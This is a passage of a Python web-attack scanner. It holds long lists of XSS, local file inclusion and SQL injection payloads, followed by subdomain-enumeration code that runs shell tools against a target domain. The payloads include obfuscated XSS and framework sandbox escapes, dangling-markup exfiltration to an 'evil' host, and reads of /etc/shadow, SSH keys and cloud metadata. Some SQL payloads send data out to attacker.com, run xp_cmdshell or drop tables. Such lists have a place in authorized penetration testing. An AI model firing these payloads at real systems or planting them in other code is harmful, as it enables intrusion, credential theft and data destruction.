    '<a href="java&NewLine;script:alert(1)">XSS</a>',
    '<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>',
    '<a href="javascript:x=\'%27-alert(1)-%27\';">XSS</a>',
    '<a href="javascript:x=\'&percnt;27-alert(1)-%27\';">XSS</a>',
    '<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>',
    '<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>',
    '<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>',
    '<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',
    '<iframe src="javascript:\'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;\'"></iframe>',
    '<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>',
    '<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>',
    '{{constructor.constructor(\'alert(1)\')()}}',
    '<div v-html="\'\'.constructor.constructor(\'alert(1)\')()">a</div>',
    '<x v-html=_c.constructor(\'alert(1)\')()>',
    '<x v-if=_c.constructor(\'alert(1)\')()>',
    '{{_c.constructor(\'alert(1)\')()}}',
    '{{_v.constructor(\'alert(1)\')()}}',
    '{{_s.constructor(\'alert(1)\')()}}',
    '<p v-show="_c.constructor`alert(1)`()">',
    '<x v-on:click=\'_b.constructor`alert(1)`()\'>click</x>',
    '<x v-bind:a=\'_b.constructor`alert(1)`()\'>',
    '<x @[_b.constructor`alert(1)`()]>',
    '<x :[_b.constructor`alert(1)`()]>',
    '<p v-=_c.constructor`alert(1)`()>',
    '<x @[_c.constructor`alert(1)`()]>',
    '<p :=_c.constructor`alert(1)`()>',
    '{{_b.constructor`alert(1)`()}}',
    '<x v-bind:is="\'script\'" src="//14.rs" />',
    '<x is=script src=//â\'­.â‚¨>',
    '<x @click=\'_b.constructor`alert(1)`()\'>click</x>',
    '<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">',
    '<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">',
    '<xyz<img/src onerror=alert(1)>>',
    '<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>',
    '<a @[\'c\\lic\\u{6b}\']="_c.constructor(\'alert(1)\')()">test</a>',
    '{{$el.ownerDocument.defaultView.alert(1)}}',
    '{{$el.innerHTML=\'\\u003cimg src onerror=alert(1)\\u003e\'}}',
    '<img src @error=e=$event.path.pop().alert(1)>',
    '<img src @error=e=$event.composedPath().pop().alert(1)>',
    '<img src @error=this.alert(1)>',
    '<svg@load=this.alert(1)>',
    '<p slot-scope="){}}])+this.constructor.constructor(\'alert(1)\')()})};//">',
    '{{_openBlock.constructor(\'alert(1)\')()}}',
    '{{_createBlock.constructor(\'alert(1)\')()}}',
    '{{_toDisplayString.constructor(\'alert(1)\')()}}',
    '{{_createVNode.constructor(\'alert(1)\')()}}',
    '<p v-show=_createBlock.constructor`alert(1)`()>',
    '<x @[_openBlock.constructor`alert(1)`()]>',
    '<x @[_capitalize.constructor`alert(1)`()]>',
    '<x @click=_withCtx.constructor`alert(1)`()>click</x>',
    '<x @click=$event.view.alert(1)>click</x>',
    '{{_Vue.h.constructor`alert(1)`()}}',
    '{{$emit.constructor`alert(1)`()}}',
    '<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>',
    '<component is=script text=alert(1)>',
    '{{$on.constructor(\'alert(1)\')()}}',
    '{{a=\'constructor\';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,\'alert(1)\')()}}',
    '{{{}.")));alert(1)//"}}',
    '{{(_=\'\'.sub).call.call({}[$=\'constructor\'].getOwnPropertyDescriptor(_.__proto__,$).value,0,\'alert(1)\')()}}',
    '{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}',
    '{{!ready && (ready = true) && ( !call ? $watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (\'\'+\'\'.toString( \'F = Function.prototype;\' + \'F.apply = F.a;\' + \'delete F.a;\' + \'delete F.valueOf;\' + \'alert(1);\' )));}}',
    '{{{}[{toString:[].join,length:1,0:\'__proto__\'}].assign=[].join;\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)//\');}}',
    '{{\'a\'[{toString:false,valueOf:[].join,length:1,0:\'__proto__\'}].charAt=[].join;$eval(\'x=alert(1)//\');}}',
    '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\');}}',
    '{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=1} } };alert(1)//\');}}',
    '{{x={\'y\':\'\'.constructor.prototype};x[\'y\'].charAt=[].join;$eval(\'x=alert(1)\');}}',
    '{{ c=\'\'.sub.call;b=\'\'.sub.bind;a=\'\'.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$phase; $root.$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type=\'UnaryExpression\'; astNode.operator=\'(window.X?void0: (window.X=true,alert(1)))+\'; astNode.argument={type:\'Identifier\',name:\'foo\'}; "); m1=B($asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=\'\'.sub; $eval(\'a(b.c)\'); [].push.apply=a; }}',
    '{{c=\'\'.sub.call;b=\'\'.sub.bind;c.$apply=$apply;c.$eval=b;$root.$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type=\'UnaryExpression\';astNode.operator=\'alert(1)\';astNode.argument={type:\'Identifier\'};");m1=$asyncQueue.pop().expression;m2=B(C,null,m1); [].push.apply=m2;$eval(\'B(b)\');}}',
    'constructor.constructor(\'alert(1)\')()',
    'a=\'constructor\';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,\'alert(1)\')()',
    'toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)',
    '{}[[\'__proto__\']][\'x\']=constructor.getOwnPropertyDescriptor;g={}[[\'__proto__\']][\'x\'];{}[[\'__proto__\']][\'y\']=g(\'\'.sub[[\'__proto__\']],\'constructor\');{}[[\'__proto__\']][\'z\']=constructor.defineProperty;d={}[[\'__proto__\']][\'z\'];d(\'\'.sub[[\'__proto__\']],\'constructor\',{value:false});{}[[\'__proto__\']][\'y\'].value(\'alert(1)\')()',
    '{}.")));alert(1)//";',
    '\'a\'.constructor.prototype.charAt=[].join;[1]|orderBy:\'x=1} } };alert(1)//\';',
    '{y:\'\'.constructor.prototype}.y.charAt=[].join;[1]|orderBy:\'x=alert(1)\'',
    'toString().constructor.prototype.charAt=[].join;[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)',
    '<input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'">',
    '<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(1)\'>',
    '<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == \'window\'">{{ [1].reduce(value.alert, 1); }}</div></div></div>',
    '<input ng-cut=$event.composedPath()|orderBy:\'(y=alert)(1)\'>',
    '<body background="//evil?',
    '<table background="//evil?',
    '<table><thead background="//evil?',
    '<table><tbody background="//evil?',
    '<table><tfoot background="//evil?',
    '<table><td background="//evil?',
    '<table><th background="//evil?',
    '<link rel=stylesheet href="//evil?',
    '<link rel=icon href="//evil?',
    '<meta http-equiv="refresh" content="0; http://evil?',
    '<img src="//evil?',
    '<image src="//evil?',
    '<video><track default src="//evil?',
    '<video><source src="//evil?',
    '<audio><source src="//evil?',
    '<input type=image src="//evil?',
    '<form><button style="width:100%;height:100%" type=submit formaction="//evil?',
    '<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?',
    '<button form=x style="width:100%;height:100%;"><form id=x action="//evil?',
    '<object data="//evil?',
    '<iframe src="//evil?',
    '<embed src="//evil?',
    '<form><button formaction=//evil>XSS</button><textarea name=x>',
    '<button form=x>XSS</button><form id=x action=//evil target=\'',
    '<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="',
    '<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="',
    '<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/',
    '<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
    '<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
    '<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
    '<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="',
    '<input type=hidden type=image src="//evil?',
    '<video poster="//evil?',
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
    'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=alert()//>',
    'javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle=\'+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//\'>',
    '\';window[\'ale\'+\'rt\'](window[\'doc\'+\'ument\'][\'dom\'+\'ain\']);//',
    '\';self[\'ale\'+\'rt\'](self[\'doc\'+\'ument\'][\'dom\'+\'ain\']);//',
    '\';this[\'ale\'+\'rt\'](this[\'doc\'+\'ument\'][\'dom\'+\'ain\']);//',
    '\';top[\'ale\'+\'rt\'](top[\'doc\'+\'ument\'][\'dom\'+\'ain\']);//',
    '\';parent[\'ale\'+\'rt\'](parent[\'doc\'+\'ument\'][\'dom\'+\'ain\']);//',
    '\';frames[\'ale\'+\'rt\'](frames[\'doc\'+\'ument\'][\'dom\'+\'ain\']);//',
    '\';globalThis[\'ale\'+\'rt\'](globalThis[\'doc\'+\'ument\'][\'dom\'+\'ain\']);//',
    '\';window[/*foo*/\'alert\'/*bar*/](window[/*foo*/\'document\'/*bar*/][\'domain\']);//',
    '\';self[/*foo*/\'alert\'/*bar*/](self[/*foo*/\'document\'/*bar*/][\'domain\']);//',
    '\';this[/*foo*/\'alert\'/*bar*/](this[/*foo*/\'document\'/*bar*/][\'domain\']);//',
    '\';top[/*foo*/\'alert\'/*bar*/](top[/*foo*/\'document\'/*bar*/][\'domain\']);//',
    '\';parent[/*foo*/\'alert\'/*bar*/](parent[/*foo*/\'document\'/*bar*/][\'domain\']);//',
    '\';frames[/*foo*/\'alert\'/*bar*/](frames[/*foo*/\'document\'/*bar*/][\'domain\']);//',
    '\';globalThis[/*foo*/\'alert\'/*bar*/](globalThis[/*foo*/\'document\'/*bar*/][\'domain\']);//',
    '\';window[\'\\x61\\x6c\\x65\\x72\\x74\'](window[\'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\'][\'\\x64\\x6f\\x6d\\x61\\x69\\x6e\']);//',
    '\';self[\'\\x61\\x6c\\x65\\x72\\x74\'](self[\'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\'][\'\\x64\\x6f\\x6d\\x61\\x69\\x6e\']);//',
    '\';this[\'\\x61\\x6c\\x65\\x72\\x74\'](this[\'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\'][\'\\x64\\x6f\\x6d\\x61\\x69\\x6e\']);//',
    '\';top[\'\\x61\\x6c\\x65\\x72\\x74\'](top[\'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\'][\'\\x64\\x6f\\x6d\\x61\\x69\\x6e\']);//',
    '\';parent[\'\\x61\\x6c\\x65\\x72\\x74\'](parent[\'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\'][\'\\x64\\x6f\\x6d\\x61\\x69\\x6e\']);//',
    '\';frames[\'\\x61\\x6c\\x65\\x72\\x74\'](frames[\'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\'][\'\\x64\\x6f\\x6d\\x61\\x69\\x6e\']);//',
    '\';globalThis[\'\\x61\\x6c\\x65\\x72\\x74\'](globalThis[\'\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\'][\'\\x64\\x6f\\x6d\\x61\\x69\\x6e\']);//',
    '\';window[\'\\x65\\x76\\x61\\x6c\'](\'window["\\x61\\x6c\\x65\\x72\\x74"](window["\\x61\\x74\\x6f\\x62"]("WFNT"))\');//',
    '\';self[\'\\x65\\x76\\x61\\x6c\'](\'self["\\x61\\x6c\\x65\\x72\\x74"](self["\\x61\\x74\\x6f\\x62"]("WFNT"))\');//',
    '\';this[\'\\x65\\x76\\x61\\x6c\'](\'this["\\x61\\x6c\\x65\\x72\\x74"](this["\\x61\\x74\\x6f\\x62"]("WFNT"))\');//',
    '\';top[\'\\x65\\x76\\x61\\x6c\'](\'top["\\x61\\x6c\\x65\\x72\\x74"](top["\\x61\\x74\\x6f\\x62"]("WFNT"))\');//',
    '\';parent[\'\\x65\\x76\\x61\\x6c\'](\'parent["\\x61\\x6c\\x65\\x72\\x74"](parent["\\x61\\x74\\x6f\\x62"]("WFNT"))\');//',
    '\';frames[\'\\x65\\x76\\x61\\x6c\'](\'frames["\\x61\\x6c\\x65\\x72\\x74"](frames["\\x61\\x74\\x6f\\x62"]("WFNT"))\');//',
    '\';globalThis[\'\\x65\\x76\\x61\\x6c\'](\'globalThis["\\x61\\x6c\\x65\\x72\\x74"](globalThis["\\x61\\x74\\x6f\\x62"]("WFNT"))\');//',
    '\';window[\'\\141\\154\\145\\162\\164\'](\'\\130\\123\\123\');//',
    '\';self[\'\\141\\154\\145\\162\\164\'](\'\\130\\123\\123\');//',
    '\';this[\'\\141\\154\\145\\162\\164\'](\'\\130\\123\\123\');//',
    '\';top[\'\\141\\154\\145\\162\\164\'](\'\\130\\123\\123\');//',
    '\';parent[\'\\141\\154\\145\\162\\164\'](\'\\130\\123\\123\');//',
    '\';frames[\'\\141\\154\\145\\162\\164\'](\'\\130\\123\\123\');//',
    '\';globalThis[\'\\141\\154\\145\\162\\164\'](\'\\130\\123\\123\');//',
    '\';window[\'\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}\'](\'\\u{0058}\\u{0053}\\u{0053}\');//',
    '\';self[\'\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}\'](\'\\u{0058}\\u{0053}\\u{0053}\');//',
    '\';this[\'\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}\'](\'\\u{0058}\\u{0053}\\u{0053}\');//',
    '\';top[\'\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}\'](\'\\u{0058}\\u{0053}\\u{0053}\');//',
    '\';parent[\'\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}\'](\'\\u{0058}\\u{0053}\\u{0053}\');//',
    '\';frames[\'\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}\'](\'\\u{0058}\\u{0053}\\u{0053}\');//',
    '\';globalThis[\'\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}\'](\'\\u{0058}\\u{0053}\\u{0053}\');//',
    '\';window[/al/.source+/ert/.source](/XSS/.source);//',
    '\';self[/al/.source+/ert/.source](/XSS/.source);//',
    '\';this[/al/.source+/ert/.source](/XSS/.source);//',
    '\';top[/al/.source+/ert/.source](/XSS/.source);//',
    '\';parent[/al/.source+/ert/.source](/XSS/.source);//',
    '\';frames[/al/.source+/ert/.source](/XSS/.source);//',
    '\';globalThis[/al/.source+/ert/.source](/XSS/.source);//',
    '\';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//',
    '\';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//',
    '\';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//',
    '\';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//',
    '\';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//',
    '\';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//',
    '\';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//',
    '<img src="javascript:alert(1)">',
    '<body background="javascript:alert(1)">',
    '<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">',
    '<a href="vbscript:MsgBox+1">XSS</a>',
    '<a href="#" onclick="vbs:Msgbox+1">XSS</a>',
    '<a href="#" onclick="VBS:Msgbox+1">XSS</a>',
    '<a href="#" onclick="vbscript:Msgbox+1">XSS</a>',
    '<a href="#" onclick="VBSCRIPT:Msgbox+1">XSS</a>',
    '<a href="#" language=vbs onclick="vbscript:Msgbox+1">XSS</a>',
    '<a href="#" onclick="jscript.compact:alert(1);">test</a>',
    '<a href="#" onclick="JSCRIPT.COMPACT:alert(1);">test</a>',
    '<a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>',
    '<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>',
    '<iframe onload=VBScript.Encode:#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>',
    '<iframe language=VBScript.Encode onload=#@~^CAAAAA==\\ko$K6,FoQIAAA==^#~@>',
    '<a title="&{alert(1)}">XSS</a>',
    '<link href="xss.js" rel=stylesheet type="text/javascript">',
    '<form><button name=x formaction=x><b>stealme',
    '<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>',
    '<div style="-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">',
    '<div style="\\-\\mo\\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">',
    '<div style="-moz-bindin\\67:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">',
    '<div style="-moz-bindin&#x5c;67:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)">',
    '<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js%22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/binding%3E%3C/bindings%3E)">',
    '<div style=xss:expression(alert(1))>',
    '<div style=xss:expression(1)-alert(1)>',
    '<div style=xss:expressio\\6e(alert(1))>',
    '<div style=xss:expressio\\006e(alert(1))>',
    '<div style=xss:expressio\\00006e(alert(1))>',
    '<div style=xss:expressio&#x5c;6e(alert(1))>',
    '<div style=xss=expression(alert(1))>',
    '<div style="color&#x3dred">test</div>',
    '<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>',
    '<script> function window.onload(){ alert(1); } </script>',
    '<script> function window::onload(){ alert(1); } </script>',
    '<script> function window.location(){ } </script>',
    '<body> <script> function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){} </script> </body>',
    '<body> <script> function document.body.innerHTML(){ x = "<img src=1 onerror=alert(1)>"; } </script> </body>',
    '<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>',
    '<a href="javascript&#x00;avascript:alert(1)">Firefox</a>',
    '<a href="javascript&colon;alert(1)">Firefox</a>',
    '<!-- ><img title="--><iframe/onload=alert(1)>"> -->',
    '<svg><xss onload=alert(1)>',
    '<isindex type=image src="//evil?',
    '<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?',
    '<isindex type=submit formaction=javascript:alert(1)>',
    '<isindex type=submit action=javascript:alert(1)>',
    '<svg><discard onbegin=alert(1)>',
    '<svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>',
    '<img src=validimage.png onloadstart=alert(1)>',
    '<input type=image onloadend=alert(1) src=validimage.png>',
    '<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>',
    '<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>',
    '<marquee onstart=alert(1)>XSS</marquee>',
    '<script>location.protocol=\'javascript\'</script>',
    '<a href="%0aalert(1)" onclick="protocol=\'javascript\'">test</a>',
    '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>',
    '<svg><use href="data:image/svg+xml,&lt;svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\'&gt;&lt;image href=\'1\' onerror=\'alert(1)\' /&gt;&lt;/svg&gt;#x" />',
    '<a href="javascript://%0aalert(1)">XSS</a>',
    '<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>'
]

        
        self.lfi_payloads = [
           '../../../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd%00',
    '/etc/passwd',
    '/etc/passwd%00',
    
    # Windows paths
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    'C:\\windows\\system32\\drivers\\etc\\hosts',
    '..%5c..%5c..%5c/windows/system32/drivers/etc/hosts',
    
    # Sensitive files
    '/etc/shadow',
    '/etc/group',
    '/etc/hosts',
    '/etc/issue',
    '/proc/self/environ',
    '/proc/version',
    '/proc/cmdline',
    
    # Log poisoning
    '../../../var/log/apache2/access.log',
    '../../../var/log/apache/access.log',
    '../../../var/log/nginx/access.log',
    '../../var/log/httpd/access_log',
    
    # PHP wrappers
    'php://filter/convert.base64-encode/resource=index.php',
    'php://filter/read=convert.base64-encode/resource=index.php',
    'php://input',
    'expect://id',
    
    # Path traversal variations
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
    '..%255c..%255c..%255c/etc/passwd',
    
    # SSH keys
    '../../../.ssh/id_rsa',
    '../../../.ssh/authorized_keys',
    
    # Config files
    '../../../etc/httpd/conf/httpd.conf',
    '../../../etc/nginx/nginx.conf',
    '../../../../opt/lampp/etc/httpd.conf',
    
    # Session files
    '/tmp/sess_{session_id}',
    '/var/lib/php/sessions/sess_{session_id}',
    
    # Cloud metadata
    'file:///etc/passwd',
    'http://169.254.169.254/latest/meta-data/'
        ]
        
        self.sqli_payloads = [
            # Classic payloads
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin'#",
    
    # Union-based
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL,@@version,3--",
    "' UNION SELECT NULL,user(),3--",
    "' UNION SELECT NULL,table_name,3 FROM information_schema.tables--",
    
    # Error-based
    "' AND 1=CONVERT(int,@@version)--",
    "' AND 1 IN (SELECT @@version)--",
    "' OR 1=1 AND 1=1/(SELECT 0 FROM pg_sleep(5))--",
    
    # Blind boolean-based
    "' AND 1=1 AND 'abc'='abc",
    "' AND 1=2 AND 'abc'='abc",
    "' AND SUBSTRING(@@version,1,1)='5'",
    
    # Time-based
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR (SELECT * FROM (SELECT(SLEEP(5)))--",
    "'%20WAITFOR%20DELAY%20'0:0:5'--",
    
    # Out-of-band
    "' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\'))--",
    "' OR (SELECT 1 FROM OPENROWSET('SQLOLEDB','DRIVER={SQL Server};SERVER=attacker,1433;','SELECT 1'))--",
    
    # Stacked queries
    "'; EXEC xp_cmdshell('whoami')--",
    "'; DROP TABLE users--",
    
    # Alternative syntax
    "') OR ('1'='1",
    "\" OR \"1\"=\"1",
    "` OR `1`=`1",
    ") OR 1=1--",
    
    # Bypass WAF
    "/*!50000OR*/ 1=1--",
    "' OR 1=1 -- -",
    "' OR '1'='1' /*",
    "' /*!50000OR*/ '1'='1",
    
    # Database-specific
    "|| 1=1--",          
    "' || 1=1--",       
    "'+AND+1=1--",      
    "SLEEP(5)#",        
        ]
        
        # Setup logging
        self.setup_logging()
        
    def setup_logging(self):
        """Setup comprehensive logging"""
        log_file = self.output_dir / "scan.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def run_command(self, command, timeout=600):
        """Execute shell command safely with enhanced error handling"""
        try:
            self.logger.info(f"Executing: {command}")
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=timeout,
                cwd=str(self.output_dir)
            )
            
            if result.stdout:
                self.logger.debug(f"STDOUT: {result.stdout[:200]}...")
            if result.stderr and result.returncode != 0:
                self.logger.warning(f"STDERR: {result.stderr[:200]}...")
                
            return result.stdout, result.stderr, result.returncode
            
        except subprocess.TimeoutExpired:
            self.logger.error(f"Command timed out: {command}")
            return "", "Command timed out", 1
        except Exception as e:
            self.logger.error(f"Command failed: {command} - {str(e)}")
            return "", str(e), 1
    
    def subdomain_enumeration_advanced(self):
        """Phase 1: Advanced Subdomain Discovery - All methods from commands"""
        self.logger.info("Starting advanced subdomain enumeration...")
        self.results['status'] = 'subdomain_enum'
        
        subdomains = set()
        
        # Method 1: Subfinder (Primary tool)
        subfinder_cmd = f"subfinder -d {self.target_domain} -all -recursive -o subdomains_subfinder.txt"
        stdout, stderr, code = self.run_command(subfinder_cmd)
        
        if code == 0:
            subfinder_file = self.output_dir / "subdomains_subfinder.txt"
            if subfinder_file.exists():
                with open(subfinder_file, 'r') as f:
                    subdomains.update(line.strip() for line in f if line.strip())
        
        # Method 2: Assetfinder
        assetfinder_cmd = f"assetfinder --subs-only {self.target_domain} | tee subdomains_assetfinder.txt"
        stdout, stderr, code = self.run_command(assetfinder_cmd)
        
        if code == 0:
            assetfinder_file = self.output_dir / "subdomains_assetfinder.txt"
            if assetfinder_file.exists():
                with open(assetfinder_file, 'r') as f:
                    subdomains.update(line.strip() for line in f if line.strip())
        
        # Method 3: Alternative subdomain discovery
        self.alternative_subdomain_discovery(subdomains)
        
        # Method 4: DNS bruteforce
        self.dns_subdomain_bruteforce(subdomains)
        
        # Save all subdomains
        self.results['subdomains'] = list(subdomains)
        with open(self.output_dir / "all_subdomains.txt", 'w') as f:
            for sub in sorted(subdomains):
                f.write(f"{sub}\n")
        
        self.logger.info(f"Found {len(subdomains)} total subdomains")
    
    def alternative_subdomain_discovery(self, subdomains):
        """Alternative subdomain discovery methods"""
        # Common subdomain bruteforce
        for sub in self.common_subdomains:
            full_domain = f"{sub}.{self.target_domain}"
            try:
                socket.gethostbyname(full_domain)
                subdomains.add(full_domain)
                self.logger.debug(f"Found subdomain via DNS: {full_domain}")
            except:
                pass
        
        # Certificate transparency logs
        self.ct_logs_search(subdomains)
        
        # Search engine dorking
        self.search_engine_subdomains(subdomains)
    
    def ct_logs_search(self, subdomains):
        """Certificate Transparency logs search"""
        try:
            ct_url = f"https://crt.sh/?q=%.{self.target_domain}&output=json"
            response = requests.get(ct_url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name = entry.get('name_value', '')
                    if name and self.target_domain in name:
                        # Handle wildcard certificates
                        names = name.split('\n')
                        for n in names:
